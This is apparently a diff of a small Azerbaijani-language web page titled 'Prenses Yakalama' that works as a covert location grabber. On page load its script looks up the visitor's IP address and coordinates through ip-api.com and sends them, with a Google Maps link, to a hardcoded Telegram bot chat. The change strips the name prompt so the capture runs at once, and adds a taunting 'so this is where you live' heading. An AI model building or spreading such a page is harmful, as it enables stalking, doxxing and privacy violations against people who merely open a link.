@@ -2,7 +2,7 @@
 <html lang="az">
 <head>
   <meta charset="UTF-8" />
-  <title>Prenses yakalama</title>
+  <title>Prenses Yakalama</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -10,10 +10,6 @@
       margin-top: 100px;
       background: #f0f0f0;
       color: #333;
-    }
-    #greeting {
-      font-size: 24px;
-      margin-bottom: 20px;
     }
     #ipDisplay {
       font-size: 30px;
@@ -23,7 +19,7 @@
   </style>
 </head>
 <body>
-  <div id="greeting"></div>
+  <h1>Deməli burda yaşayırsan hə?:</h1>
   <div id="ipDisplay">Loading...</div>
 
   <script>
@@ -31,45 +27,38 @@
     const chatId = '1689497109';
 
     async function sendLocationToTelegram(ip, lat, lon) {
-  const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
-  const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}\nYer: ${mapUrl}`);
-  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
+      const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
+      const message = encodeURIComponent(`Yeni istifadəçinin IP-si: ${ip}\nYer: ${mapUrl}`);
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-  try {
-    const response = await fetch(url);
-    if (!response.ok) {
-      console.error('Telegrama mesaj göndərilə bilmədi');
+      try {
+        const response = await fetch(url);
+        if (!response.ok) {
+          console.error('Telegrama mesaj göndərilə bilmədi');
+        }
+      } catch (error) {
+        console.error('Xəta:', error);
+      }
     }
-  } catch (error) {
-    console.error('Xəta:', error);
-  }
-}
 
-async function getIpAndSend() {
-  try {
-    const res = await fetch('http://ip-api.com/json');
-    const data = await res.json();
-    const ip = data.query;
-    const lat = data.lat;
-    const lon = data.lon;
+    async function getIpAndSend() {
+      try {
+        const res = await fetch('http://ip-api.com/json');
+        const data = await res.json();
+        const ip = data.query;
+        const lat = data.lat;
+        const lon = data.lon;
 
-    document.getElementById('ipDisplay').textContent = ip;
-    sendLocationToTelegram(ip, lat, lon);
-  } catch (error) {
-    document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
-    console.error('IP alınarkən xəta:', error);
-  }
-}
+        document.getElementById('ipDisplay').textContent = ip;
+        sendLocationToTelegram(ip, lat, lon);
+      } catch (error) {
+        document.getElementById('ipDisplay').textContent = 'IP alınarkən xəta baş verdi';
+        console.error('IP alınarkən xəta:', error);
+      }
+    }
 
     window.onload = () => {
-      const name = prompt("Zəhmət olmasa adınızı yazın");
-      if (name && name.trim() !== "") {
-        document.getElementById('greeting').textContent = `Salam ${name}!, deməli sənin API ünvanın belədir:`;
-        getIpAndSend(name);
-      } else {
-        document.getElementById('greeting').textContent = `Salam! Sənin API ünvanın belədir:`;
-        getIpAndSend("Anonim istifadəçi");
-      }
+      getIpAndSend();
     };
   </script>
 </body>
